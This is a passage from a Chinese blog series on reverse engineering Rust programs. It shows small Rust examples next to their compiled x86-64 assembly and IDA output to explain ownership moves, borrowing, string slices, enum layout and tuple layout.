<p>对于一个对象实例，为防止其所有权被多个变量拥有，当另外一个变量尝试获取其所有权时，原先变量对其的所有权将被夺走。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;I&#x27;m CoLin&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于上述代码，逆向出来的结果比较有趣，往下看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, 280</span><br><span class="line">mov     byte ptr [rsp + 231], 0</span><br><span class="line">mov     byte ptr [rsp + 231], 1</span><br><span class="line">lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">lea     rdi, [rsp + 40]</span><br><span class="line">mov     qword ptr [rsp + 16], rdi</span><br><span class="line">mov     edx, 9</span><br><span class="line">call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br></pre></td></tr></table></figure>
<p>上面是第一行<code>from</code>函数的逆向，可以看到<code>from</code>函数实际传参用了三个寄存器，<code>rdi</code>为目的<code>String</code>实例指针，<code>rsi</code>为字符串字面量地址，<code>rdx</code>为字符串长度。可以看到这里<code>[rsp+16]</code>保存了<code>String</code>实例的栈地址，这也就是变量<code>x</code>的保存位置。</p>
<p>后面略过<code>println!</code>看第三行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov     byte ptr [rsp + 231], 0</span><br><span class="line">mov     rax, qword ptr [rsp + 56]</span><br><span class="line">mov     qword ptr [rsp + 144], rax</span><br><span class="line">movups  xmm0, xmmword ptr [rsp + 40]</span><br><span class="line">movaps  xmmword ptr [rsp + 128], xmm0</span><br><span class="line">lea     rax, [rsp + 128]</span><br><span class="line">mov     qword ptr [rsp + 248], rax</span><br><span class="line">lea     rax, [rip + &lt;alloc::string::String as core::fmt::Display&gt;::fmt]</span><br><span class="line">mov     qword ptr [rsp + 256], rax</span><br><span class="line">mov     rax, qword ptr [rsp + 248]</span><br><span class="line">mov     qword ptr [rsp], rax</span><br></pre></td></tr></table></figure>
<p>上面的代码将<code>String</code>实例占用的0x18大小内存空间（len、ptr、capacity）拷贝到了<code>[rsp+128]</code>的地方，一次使用<code>rax</code>拷贝，一次使用<code>xmm0</code>拷贝。随后，<code>[rsp+128]</code>这个指针被拷贝到<code>[rsp+248]</code>和<code>[rsp]</code>中，推测变量<code>y</code>就保存在<code>[rsp]</code>。</p>
<p>可以看到，<code>String</code>实例的移动会在栈上再创建一个<code>String</code>实例空间，但实际指向的字符串指针相同。不过有意思的是，Rust在后续并没有对变量<code>x</code>的内存空间进行任何处理。在<code>y</code>使用完之前，<code>x</code>不能将自身的实例删除，这样相当于也删除了<code>y</code>。但后续代码将不再使用变量<code>x</code>，即如果变量<code>y</code>在后续进行了更新，字符串地址发生了改变，变量<code>x</code>中保存的字符串地址也无法同步更新。不过Rust并没有将变量<code>x</code>的所有内容清空，而是继续保留在原来的位置。也就会说，变量<code>x</code>在移动操作完成之后，其保存的内容将永远是移动操作完成前一刻的内容，且此后正常情况下不再改变。不过没有清空就意味着有数据泄露的可能性。倘若Rust代码中有Unsafe部分代码被攻击者利用，这部分数据可就危险了。</p>
<p>下面的代码示例证明了变量移动后并没有被删除。两次输出的结果相同，均为llo，你可能会想：为什么已经被Rust废弃的变量依然能够具有引用。因为Rust中的废弃和生命周期走向结束并不相同，废弃仅仅代表后续代码无法对其进行访问，无法获取其所有权，但对于引用类型，还是可以使用的，但无法获取其所有权。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span>: <span class="type">String</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x[<span class="number">2</span>..];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>, y);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="reverse-for-references-and-borrows"><a class="markdownIt-Anchor" href="#reverse-for-references-and-borrows"></a> Reverse for References and Borrows</h1>
<p>引用和借用是Rust的重要特性，它允许一个变量在不获取所有权、不转移所有权的前提下使用某个变量。借用指的是通过引用传递参数给函数的方法。既然涉及函数传参，那么下面我们就来通过一个函数调用的示例对Rust的引用与借用进行源码和汇编层面的分析。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">print_len</span>(s: &amp;<span class="type">String</span>) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;the length of the string &#123;&#125; is: &#123;&#125;&quot;</span>, s, s.<span class="title function_ invoke__">len</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_len</span>(&amp;x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是<code>main</code>函数的部分反编译结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, 56</span><br><span class="line">lea     rsi, [rip + .L__unnamed_6]</span><br><span class="line">lea     rdi, [rsp + 16]</span><br><span class="line">mov     qword ptr [rsp + 8], rdi</span><br><span class="line">mov     edx, 5</span><br><span class="line">call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">mov     rdi, qword ptr [rsp + 8]</span><br><span class="line">call    example::print_len</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>main</code>函数直接将<code>x</code>的内存地址，即保存<code>String</code>实例地址的地址传递给<code>print_len</code>函数。这样子函数只需要通过获取该地址即可完成后续操作。</p>
<p>但是转念一想，如果子函数的参数不是引用，只是单纯的<code>String</code>，汇编代码层又会有什么不同呢？这样的例子总是存在的，当一个结构体非常庞大时，如果只通过寄存器与栈传递参数，未免有点太不优雅了。下面是将参数修改为<code>String</code>后<code>main</code>函数的部分反编译结果：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, <span class="number">56</span></span><br><span class="line">lea     rdi, [rsp + <span class="number">8</span>]</span><br><span class="line">lea     rsi, [rip + .L__unnamed_6]</span><br><span class="line">mov     edx, <span class="number">5</span></span><br><span class="line">call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::convert::<span class="built_in">From</span>&lt;&amp;<span class="type">str</span>&gt;&gt;::from</span><br><span class="line">mov     rax, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line">mov     qword ptr [rsp + <span class="number">32</span>], rax</span><br><span class="line">mov     rax, qword ptr [rsp + <span class="number">16</span>]</span><br><span class="line">mov     qword ptr [rsp + <span class="number">40</span>], rax</span><br><span class="line">mov     rax, qword ptr [rsp + <span class="number">24</span>]</span><br><span class="line">mov     qword ptr [rsp + <span class="number">48</span>], rax</span><br><span class="line">lea     rdi, [rsp + <span class="number">32</span>]</span><br><span class="line">call    example::print_len</span><br></pre></td></tr></table></figure>
<p>可以看到，这里实际上传递到<code>print_len</code>函数的参数依然只有1个，但不同的是，<code>main</code>函数首先将<code>String</code>实例在栈上复制了一份，然后将复制那份的地址传了过去。另外，对于实例的删除位置不同，这是由Rust语言特性所决定的，不加引用意味着变量的所有权被转移到了子函数中，删除操作将在子函数中进行；加引用则所有权不转移，删除操作将在父函数中进行。不加引用的父函数操作与移动非常相似，只不过是没有将复制出来的实例地址放到栈的某处。想来其实也很合理，不加引用实际上就是完成了所有权的移动嘛。</p>
<h1 id="reverse-for-string-slices"><a class="markdownIt-Anchor" href="#reverse-for-string-slices"></a> Reverse for String Slices</h1>
<p>在Rust中，存在与Python类似的切片类型Slice，对于字符串而言，字符串字面量也可以看做是一个字符串切片。</p>
<p>考虑下面的Rust代码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;I&#x27;m CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x[<span class="number">4</span>..];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其部分反编译结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, 184</span><br><span class="line">lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">lea     rdi, [rsp + 40]</span><br><span class="line">mov     qword ptr [rsp + 16], rdi</span><br><span class="line">mov     edx, 9</span><br><span class="line">call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">mov     rdi, qword ptr [rsp + 16]</span><br><span class="line">mov     qword ptr [rsp + 80], 4</span><br><span class="line">mov     rsi, qword ptr [rsp + 80]</span><br><span class="line">lea     rdx, [rip + .L__unnamed_6]</span><br><span class="line">call    &lt;alloc::string::String as core::ops::index::Index&lt;core::ops::range::RangeFrom&lt;usize&gt;&gt;&gt;::index</span><br><span class="line">mov     qword ptr [rsp + 24], rdx</span><br><span class="line">mov     qword ptr [rsp + 32], rax</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>String</code>实例指针，即变量<code>x</code>被保存在<code>[rsp+16]</code>的位置，随后程序调用了一个<code>core::ops::index::Index&lt;core::ops::range::RangeFrom&lt;usize&gt;&gt;&gt;::index</code>方法，实际上也就是从字符串中获取切片的方法。该方法的参数按顺序依次为：<code>String</code>实例指针、切片的起始索引值、另外一个字符串切片，这第三个参数指向的是保存工程名的字符串，可以忽略。如果将Rust源码的<code>[4..]</code>改为<code>[4..7]</code>，会发现第三个参数变成了7，函数名变成了<code>Range</code>，如果是<code>[..4]</code>，则函数名为<code>RangeTo</code>，传参与<code>[4..]</code>完全相同。由此可见字符串取切片实际上有3个方法控制。返回值由两个寄存器传递，<code>rdx</code>保存的是长度，<code>rax</code>保存的是字符串指针。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文按照Rust权威指南的讲解顺序，向后学习了：</p>
<ol>
<li>变量隐藏在汇编层中的表现，隐藏后变量值不变</li>
<li>数组变量在汇编层的数据结构，与C类似</li>
<li>变量移动在汇编层与变量隐藏类似</li>
<li>字符串切片相关操作在汇编层的实现</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/20/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/20/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-2/" class="post-title-link" itemprop="url">Rust逆向学习 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-20 10:18:28" itemprop="dateCreated datePublished" datetime="2023-10-20T10:18:28+08:00">2023-10-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-22 16:57:52" itemprop="dateModified" datetime="2023-10-22T16:57:52+08:00">2023-10-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>6.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在上一篇文章中，我们比较完美地完成了第一次Rust ELF的逆向工作，但第一次编写的Rust程序毕竟只使用了非常有限的几种Rust特性，Rust还有很多的东西没有涉及，像是流程控制、泛型、Trait等。这些内容我们将在本文以及以后的文章中一一进行学习与探索。</p>
<h1 id="guess-a-number"><a class="markdownIt-Anchor" href="#guess-a-number"></a> Guess a number</h1>
<h2 id="0x01-guess-a-number-part-1"><a class="markdownIt-Anchor" href="#0x01-guess-a-number-part-1"></a> 0x01. Guess a number .part 1</h2>
<p>本文从一个跳跃不是很大的程序开始，也就是一个真正的猜数字小程序：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::cmp::Ordering;</span><br><span class="line"><span class="keyword">use</span> std::io;    <span class="comment">// prelude</span></span><br><span class="line"><span class="keyword">use</span> rand::Rng;  <span class="comment">// trait</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">secret</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>, <span class="number">101</span>);    <span class="comment">// ThreadRng: random number generator</span></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Please guess a number between 1 and 100:&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">            .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Cannot read a line!&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Your guess is: &#123;&#125;&quot;</span>, guess);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">guess</span>: <span class="type">u32</span> = <span class="keyword">match</span> guess.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>() &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(num) =&gt; num,</span><br><span class="line">            <span class="title function_ invoke__">Err</span>(_) =&gt; <span class="keyword">continue</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">match</span> guess.<span class="title function_ invoke__">cmp</span>(&amp;secret)&#123;</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too small.&quot;</span>),</span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too large.&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; &#123; </span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;You win.&quot;</span>); </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里要注意，使用上一篇文章中的<a target="_blank" rel="noopener" href="https://godbolt.org/">编译工具网站</a>时需要添加库并在代码中通过<code>extern crate rand</code>手动加载rand库，否则会编译失败。</p>
<p>考虑到效率问题，本文对于上述代码的反汇编以IDA的反汇编结果为主，汇编代码分析为辅。</p>
<p><img src="1.png" alt="" /></p>
<h3 id="line-1"><a class="markdownIt-Anchor" href="#line-1"></a> line 1</h3>
<p>第一行中<code>thread_rng</code>方法返回<code>ThreadRng</code>实例，也就是使用于单个线程的随机数产生器实例，随后将其作为参数1（即self），参数2和参数3分别为范围的下界和上界。通过汇编代码可以发现，<code>Range</code>这个对象需要两个寄存器传递。通过查看Rust官方库源码也可以发现，<code>Range</code>实际上也就只有开始和结尾这两个属性值：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Range</span>&lt;Idx&gt; &#123;</span><br><span class="line">    <span class="comment">/// The lower bound of the range (inclusive).</span></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;rust1&quot;</span>, since = <span class="string">&quot;1.0.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> start: Idx,</span><br><span class="line">    <span class="comment">/// The upper bound of the range (exclusive).</span></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;rust1&quot;</span>, since = <span class="string">&quot;1.0.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> end: Idx,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>gen_range</code>方法以常规的方式使用<code>rax</code>返回了生成的随机数值。</p>
<p>随后，一个<code>drop_in_place</code>直接删除了<code>ThreadRng</code>实例，可见Rust对于生命周期的管理非常严格，后续代码已经没有使用<code>ThreadRng</code>实例的代码，因此Rust直接就将其删除了，尽最大可能减少对象重用与悬垂指针引用的可能。</p>
<h3 id="loop"><a class="markdownIt-Anchor" href="#loop"></a> loop</h3>
<p>在Rust的反汇编界面中，<code>continue</code>很少见到，因为对于一个循环而言，其内部很有可能存在生命周期在循环之内的对象，因此即使Rust代码中写<code>continue</code>，Rust也需要首先将循环中创建的对象删除之后再开始新一轮循环。这也就导致IDA的反汇编界面中可能会出现很多<code>goto</code>。</p>
<h3 id="line-3~7"><a class="markdownIt-Anchor" href="#line-3~7"></a> line 3~7</h3>
<p><code>println!</code>的特征很好识别，<code>Arguments::new_v1</code>和<code>_print</code>一出，就知道肯定又是一次输出，不过输出的具体字符串内容直接查看反汇编界面无法确定，不过在汇编代码中也很好找。随后的<code>String::new</code>等也非常正常。</p>
<h3 id="match"><a class="markdownIt-Anchor" href="#match"></a> match</h3>
<p>上述代码一共有两个<code>match</code>语句，第一个是将字符串<code>parse</code>的结果进行判断，替换了上一篇文章中的<code>expect</code>。这里<code>parse</code>函数的返回值是一个枚举对象<code>Result&lt;F, F::Err&gt;</code>。我们知道Rust的枚举对象是一个很强大的结构，比C/C++中的枚举对象好用很多，这是因为Rust的枚举对象可以理解成一个Key有限且确定的Map，选择一个Key之后还能够根据Key指定的数据类型自由设置Value。在这里我们不妨研究一下，Rust中的枚举对象是如何组织的。</p>
<h2 id="0x02-reverse-for-enum"><a class="markdownIt-Anchor" href="#0x02-reverse-for-enum"></a> 0x02. Reverse for enum</h2>
<p>下面通过一个简单的程序对枚举类型进行逆向分析。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Freshman</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Sophomore</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Junior</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Senior</span>(<span class="type">String</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">get_student</span>(grade: <span class="type">i32</span>, name: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;Student&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> grade &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Freshman</span>(name)),</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Sophomore</span>(name)),</span><br><span class="line">        <span class="number">3</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Junior</span>(name)),</span><br><span class="line">        <span class="number">4</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Senior</span>(name)),</span><br><span class="line">        _ =&gt; <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">get_student</span>(<span class="number">4</span>, <span class="string">&quot;CoLin&quot;</span>.<span class="title function_ invoke__">to_string</span>()).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码定义了一个枚举类型。首先来看<code>get_student</code>方法：</p>
<p><img src="2.png" alt="" /></p>
<p>可以看到，在反汇编界面中，IDA将<code>match</code>语句识别为<code>switch</code>语句，通过汇编代码的分析也能够很容易地发现<strong>跳表</strong>的存在。</p>
<p><img src="3.png" alt="" /></p>
<p>通过查看main函数的方法调用，可以获得<code>get_student</code>方法的参数分别为：<code>Student</code>对象指针、<code>grade</code>参数、<code>name</code>参数。在<code>switch</code>语句中，我们发现每一个分支都有大量的值传送指令，含义未知，但我们可以通过函数调用前后获取到枚举类型的大小与内容。</p>
<p><img src="4.png" alt="" /></p>
<p>经过分析，获取到了枚举对象的内容如上图所示。从函数内容等处可以推断出，枚举对象的第一个值3表示的是枚举对象<code>grade</code>的关键字索引，这里由于返回的是<code>Student::Senior</code>，索引为3，也即枚举对象中的4个索引值对应了0、1、2、3这4个索引值。后面还有3个值，其中有字符串指针和字符串长度，经过测试发现，<code>String</code>对象占0x18大小内存，偏移0x8为字符串指针，偏移0和0x10均为字符串长度。</p>
<p>之后，笔者修改了<code>Student</code>枚举类型的定义，在每一项后面加上了一个<code>i32</code>，经过调试发现枚举类型的属性偏移如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0         枚举索引</span><br><span class="line">0x4         i32</span><br><span class="line">0x8~0x20    String</span><br></pre></td></tr></table></figure>
<p>位于后面的<code>i32</code>类型反而在内存中更加靠前了。笔者推测这可能与Rust对<code>tuple</code>的内存排布有关，考虑到枚举索引很少有超过1个字节（不然就意味着有超过255个分支），使用后面4个字节能节省一定的内存空间。不过无论<code>tuple</code>是如何排布的，Rust的枚举类型在内存中的布局现在已经很清楚了，就是<font color=red><strong>索引值+内容</strong></font>。</p>
<p>不过既然都已经看到了<code>tuple</code>的不寻常，接下来不妨也对其进行一番研究。</p>
<h2 id="0x03-reverse-for-tuple"><a class="markdownIt-Anchor" href="#0x03-reverse-for-tuple"></a> 0x03. Reverse for Tuple</h2>
<p>下面将尝试通过数个Tuple的反编译结果分析Tuple的内存布局。众所周知，Tuple就是若干个数据的集合，这些数据之间没有什么明确的关联，只有一个Tuple将它们约束在一个集合中。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = (<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="type">String</span>::<span class="title function_ invoke__">new</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于上述代码逆向的结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 72</span><br><span class="line">        lea     rdi, [rsp + 48]</span><br><span class="line">        call    alloc::string::String::new</span><br><span class="line">        mov     dword ptr [rsp], 2</span><br><span class="line">        mov     dword ptr 